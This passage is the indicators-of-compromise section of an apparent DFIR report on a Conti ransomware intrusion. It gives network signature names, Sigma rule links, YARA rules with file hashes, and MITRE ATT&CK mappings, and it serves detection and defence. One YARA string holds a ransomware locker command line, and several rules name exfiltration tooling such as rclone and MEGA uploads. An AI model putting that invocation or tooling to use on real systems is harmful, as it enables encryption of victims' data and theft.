ETPRO TROJAN Cobalt Strike Malleable C2 JQuery Custom Profile M2
ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) 
ET USER\_AGENTS AnyDesk Remote Desktop Software User-Agent 
ET POLICY HTTP POST to MEGA Userstorage 
```

### Sigma



```
rclone_execution.yaml (https://gist.github.com/beardofbinary/fede0607e830aa1add8deda3d59d9a77)
sysmon_in_memory_powershell.yml (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/image\_load/sysmon\_in\_memory\_powershell.yml)
win_susp_wmic_proc_create_rundll32.yml (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process\_creation/win\_susp\_wmic\_proc\_create\_rundll32.yml)
sysmon_abusing_debug_privilege.yml (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process\_creation/sysmon\_abusing\_debug\_privilege.yml)
win_trust_discovery.yml (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process\_creation/win\_trust\_discovery.yml)
win_office_shell.yml (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process\_creation/win\_office\_shell.yml)
win_mshta_spawn_shell.yml (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process\_creation/win\_mshta\_spawn\_shell.yml)
win_susp_net_execution.yml (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process\_creation/win\_susp\_net\_execution.yml)
win_susp_regsvr32_anomalies.yml (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process\_creation/win\_susp\_regsvr32\_anomalies.yml)
sysmon_rundll32_net_connections.yml (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network\_connection/sysmon\_rundll32\_net\_connections.yml)
win_net_enum.yml (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process\_creation/win\_net\_enum.yml)
win_susp_wmi_execution.yml (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process\_creation/win\_susp\_wmi\_execution.yml)
```

### Yara



```
/*
 YARA Rule Set
 Author: TheDFIRReport
 Date: 2021-11-29
 Identifier: 5794
 */

/* Rule Set ----------------------------------------------------------------- */

rule mal_host2_143 {
   meta:
      description = "mal - file 143.dll"
      author = "TheDFIRReport"
      date = "2021-11-29"
      hash1 = "6f844a6e903aa8e305e88ac0f60328c184f71a4bfbe93124981d6a4308b14610"
   strings:
      $x1 = "object is remotepacer: H\_m\_prev=reflect mismatchremote I/O errorruntime: g: g=runtime: addr = runtime: base = runtime: gp: gp=" ascii
      $x2 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != \_Pgcstop)sysGrow bounds not aligned to palloc" ascii
      $x3 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGetCurrentDirectoryWGetFileA" ascii
      $x4 = "Go pointer stored into non-Go memoryUnable to determine system directoryaccessing a corrupted shared libraryruntime: VirtualQuer" ascii
      $x5 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWSetEndOfFileTransmitFileabi mismatchadvapi32" ascii
      $x6 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii
      $x7 = "unknown pcws2\_32.dll of size (targetpc= KiB work, freeindex= gcwaiting= heap\_live= idleprocs= in status mallocing= ms clock" ascii
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii
      $x9 = ".lib section in a.out corruptedbad write barrier buffer boundscall from within the Go runtimecannot assign requested addresscasg" ascii
      $x10 = "Ptrmask.lockentersyscallblockexec format errorg already scannedglobalAlloc.mutexlocked m0 woke upmark - bad statusmarkBits overf" ascii
      $x11 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii
      $x12 = "ollectionidentifier removedindex out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation c" ascii
      $s13 = "y failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime: invalid typeBitsBulkBarrierrunt" ascii
      $s14 = "ddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll KiB total, [recovered] allocCount found at *( gcscandone m->gs" ascii
      $s15 = ".dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend tracegc" fullword ascii
      $s16 = "ked to threadCommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLookupAccountNameWRFS specific errorSetFile" ascii
      $s17 = "mstartbad sequence numberdevice not a streamdirectory not emptydisk quota exceededdodeltimer: wrong Pfile already closedfile alr" ascii
      $s18 = "structure needs cleaning bytes failed with errno= to unused region of spanGODEBUG: can not enable \"GetQueuedCompletionStatus\_cg" ascii
      $s19 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii
      $s20 = "tProcessIdGetSystemDirectoryWGetTokenInformationWaitForSingleObjectadjusttimers: bad pbad file descriptorbad notifyList sizebad " ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule mal_host1_D8B3 {
   meta:
      description = "mal - file D8B3.dll"
      author = "TheDFIRReport"
      date = "2021-11-29"
      hash1 = "4a49cf7539f9fd5cc066dc493bf16598a38a75f7b656224db1ddd33005ad76f6"
   strings:
      $x1 = "object is remotepacer: H\_m\_prev=reflect mismatchremote I/O errorruntime: g: g=runtime: addr = runtime: base = runtime: gp: gp=" ascii
      $x2 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != \_Pgcstop)sysGrow bounds not aligned to palloc" ascii
      $x3 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGetCurrentDirectoryWGetFileA" ascii
      $x4 = "Go pointer stored into non-Go memoryUnable to determine system directoryaccessing a corrupted shared libraryruntime: VirtualQuer" ascii
      $x5 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWSetEndOfFileTransmitFileabi mismatchadvapi32" ascii
      $x6 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii
      $x7 = "unknown pcws2\_32.dll of size (targetpc= KiB work, freeindex= gcwaiting= heap\_live= idleprocs= in status mallocing= ms clock" ascii
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii
      $x9 = ".lib section in a.out corruptedbad write barrier buffer boundscall from within the Go runtimecannot assign requested addresscasg" ascii
      $x10 = "Ptrmask.lockentersyscallblockexec format errorg already scannedglobalAlloc.mutexlocked m0 woke upmark - bad statusmarkBits overf" ascii
      $x11 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii
      $x12 = "ollectionidentifier removedindex out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation c" ascii
      $s13 = "y failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime: invalid typeBitsBulkBarrierrunt" ascii
      $s14 = "ddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll KiB total, [recovered] allocCount found at *( gcscandone m->gs" ascii
      $s15 = ".dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend tracegc" fullword ascii
      $s16 = "ked to threadCommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLookupAccountNameWRFS specific errorSetFile" ascii
      $s17 = "mstartbad sequence numberdevice not a streamdirectory not emptydisk quota exceededdodeltimer: wrong Pfile already closedfile alr" ascii
      $s18 = "structure needs cleaning bytes failed with errno= to unused region of spanGODEBUG: can not enable \"GetQueuedCompletionStatus\_cg" ascii
      $s19 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii
      $s20 = "tProcessIdGetSystemDirectoryWGetTokenInformationWaitForSingleObjectadjusttimers: bad pbad file descriptorbad notifyList sizebad " ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}


rule mal_host2_AnyDesk {
   meta:
      description = "mal - file AnyDesk.exe"
      author = "TheDFIRReport"
      date = "2021-11-29"
      hash1 = "8f09c538fc587b882eecd9cfb869c363581c2c646d8c32a2f7c1ff3763dcb4e7"
   strings:
      $x1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" pu" ascii
      $x2 = "C:\\Buildbot\\ad-windows-32\\build\\release\\app-32\\win\_loader\\AnyDesk.pdb" fullword ascii
      $s3 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" pu" ascii
      $s4 = "<assemblyIdentity version=\"6.3.2.0\" processorArchitecture=\"x86\" name=\"AnyDesk.AnyDesk.AnyDesk\" type=\"win32\" />" fullword ascii
      $s5 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0O" fullword ascii
      $s6 = "(Symantec SHA256 TimeStamping Signer - G3" fullword ascii
      $s7 = "(Symantec SHA256 TimeStamping Signer - G30" fullword ascii
      $s8 = "http://ocsp.digicert.com0N" fullword ascii
      $s9 = "http://www.digicert.com/CPS0" fullword ascii
      $s10 = "Bhttp://cacerts.digicert.com/DigiCertSHA2AssuredIDCodeSigningCA.crt0" fullword ascii
      $s11 = "<description>AnyDesk screen sharing and remote control software.</description>" fullword ascii
      $s12 = "/http://crl3.digicert.com/sha2-assured-cs-g1.crl05" fullword ascii
      $s13 = "/http://crl4.digicert.com/sha2-assured-cs-g1.crl0L" fullword ascii
      $s14 = "%jgmRhZl%" fullword ascii
      $s15 = "5ZW:\"Wfh" fullword ascii
      $s16 = "5HRe:\\" fullword ascii
      $s17 = "ysN.JTf" fullword ascii
      $s18 = "Z72.irZ" fullword ascii
      $s19 = "Ve:\\-Sj7" fullword ascii
      $s20 = "ekX.cFm" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      1 of ($x*) and 4 of them
}

rule ProcessHacker {
   meta:
      description = "mal - file ProcessHacker.exe"
      author = "TheDFIRReport"
      date = "2021-11-29"
      hash1 = "d4a0fe56316a2c45b9ba9ac1005363309a3edc7acf9e4df64d326a0ff273e80f"
   strings:
      $x1 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe" fullword wide
      $x2 = "D:\\Projects\\processhacker2\\bin\\Release32\\ProcessHacker.pdb" fullword ascii
      $x3 = "ProcessHacker.exe" fullword wide
      $x4 = "kprocesshacker.sys" fullword wide
      $x5 = "ntdll.dll!NtDelayExecution" fullword wide
      $x6 = "ntdll.dll!ZwDelayExecution" fullword wide
      $s7 = "PhInjectDllProcess" fullword ascii
      $s8 = "\_PhUiInjectDllProcess@8" fullword ascii
      $s9 = "logonui.exe" fullword wide
      $s10 = "Executable files (*.exe;*.dll;*.ocx;*.sys;*.scr;*.cpl)" fullword wide
      $s11 = "\\x86\\ProcessHacker.exe" fullword wide
      $s12 = "user32.dll!NtUserGetMessage" fullword wide
      $s13 = "ntdll.dll!NtWaitForKeyedEvent" fullword wide
      $s14 = "ntdll.dll!ZwWaitForKeyedEvent" fullword wide
      $s15 = "ntdll.dll!NtReleaseKeyedEvent" fullword wide
      $s16 = "ntdll.dll!ZwReleaseKeyedEvent" fullword wide
      $s17 = "\\kprocesshacker.sys" fullword wide
      $s18 = "\\SystemRoot\\system32\\drivers\\ntfs.sys" fullword wide
      $s19 = "\_PhExecuteRunAsCommand2@36" fullword ascii
      $s20 = "\_PhShellExecuteUserString@20" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule unlocker {
   meta:
      description = "mal - file unlocker.exe"
      author = "TheDFIRReport"
      date = "2021-11-29"
      hash1 = "09d7fcbf95e66b242ff5d7bc76e4d2c912462c8c344cb2b90070a38d27aaef53"
   strings:
      $s1 = "For more detailed information, please visit http://www.jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide
      $s2 = "(Symantec SHA256 TimeStamping Signer - G20" fullword ascii
      $s3 = " <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s4 = "(Symantec SHA256 TimeStamping Signer - G2" fullword ascii
      $s5 = "Causes Setup to create a log file in the user's TEMP directory." fullword wide
      $s6 = "Prevents the user from cancelling during the installation process." fullword wide
      $s7 = "Same as /LOG, except it allows you to specify a fixed path/filename to use for the log file." fullword wide
      $s8 = " <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii
      $s9 = "The Setup program accepts optional command line parameters." fullword wide
      $s10 = "Instructs Setup to load the settings from the specified file after having checked the command line." fullword wide
      $s11 = "Overrides the default component settings." fullword wide
      $s12 = "/MERGETASKS=\"comma separated list of task names\"" fullword wide
      $s13 = "/PASSWORD=password" fullword wide
      $s14 = "Specifies the password to use." fullword wide
      $s15 = "yyyyvvvvvvvvvxxw" fullword ascii
      $s16 = "yyyyyyrrrsy" fullword ascii
      $s17 = " processorArchitecture=\"x86\"" fullword ascii
      $s18 = " processorArchitecture=\"x86\"" fullword ascii
      $s19 = "Prevents Setup from restarting the system following a successful installation, or after a Preparing to Install failure that requ" wide
      $s20 = "/DIR=\"x:\\dirname\"" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      8 of them
}

rule mal_host2_locker {
   meta:
      description = "mal - file locker.bat"
      author = "TheDFIRReport"
      date = "2021-11-29"
      hash1 = "1edfae602f195d53b63707fe117e9c47e1925722533be43909a5d594e1ef63d3"
   strings:
      $x1 = "\_locker.exe -m -net -size 10 -nomutex -p" ascii
   condition:
      uint16(0) == 0x7473 and filesize < 8KB and
      $x1
}
```

### MITRE



```
T1218.010 - Signed Binary Proxy Execution: Regsvr32
T1218.005 - Signed Binary Proxy Execution: Mshta
T1218.011 - Signed Binary Proxy Execution: Rundll32
T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage
T1105 - Ingress Tool Transfer
T1059.005 - Command and Scripting Interpreter: Visual Basic
T1059.007 - Command and Scripting Interpreter: JavaScript
T1059.001 - Command and Scripting Interpreter: PowerShell
T1055 - Process Injection
T1486 - Data Encrypted for Impact
T1482 - Domain Trust Discovery
T1047 - Windows Management Instrumentation
T1021.002 - Remote Services: SMB/Windows Admin Shares
T1124 - System Time Discovery
T1021.001 - Remote Services: Remote Desktop Protocol
T1566.001 - Phishing: Spearphishing Attachment
T1087.002 - Account Discovery: Domain Account
T1087.001 - Account Discovery: Local Account
T1057 - Process Discovery
T1083 - File and Directory Discovery
T1590.005 - Gather Victim Network Information: IP Addresses

```

### MITRE Software



```
Net – S0039
Nltest – S0359
Cmd – S0106
Tasklist – S0057
Cobalt Strike – S0154
AdFind - S0552

```

### Reference


* Detecting Rclone – An Effective Tool for Exfiltration, NCC Group – https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/
* Rundll32, Red Canary – https://redcanary.com/threat-detection-report/techniques/rundll32/
* TA551 (Shathak) continues pushing BazarLoader, infections lead to Cobalt Strike, SANS ISC – https://isc.sans.edu/forums/diary/TA551+Shathak+continues+pushing+BazarLoader+infections+lead+to+Cobalt+Strike/27738/
* AnyDesk – https://www.anydesk.com
* AdFind, TheDFIRReport – https://thedfirreport.com/2020/05/08/adfind-recon/
* Invoke-ShareFinder, GitHub [Veil PowerView] – https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1
* taskmgr.exe slashing numbers, Hexicorn – https://www.hexacorn.com/blog/2018/07/22/taskmgr-exe-slashing-numbers/


Internal case #5794






#### Tags:
[[Conti]] [[UTC]] [[Org:]] [[DLL]] [[GG]] [[Rclone]] [[AnyDesk]] [[meta:]] [["mal]] [["TheDFIRReport"]] [[The DFIR Report]]
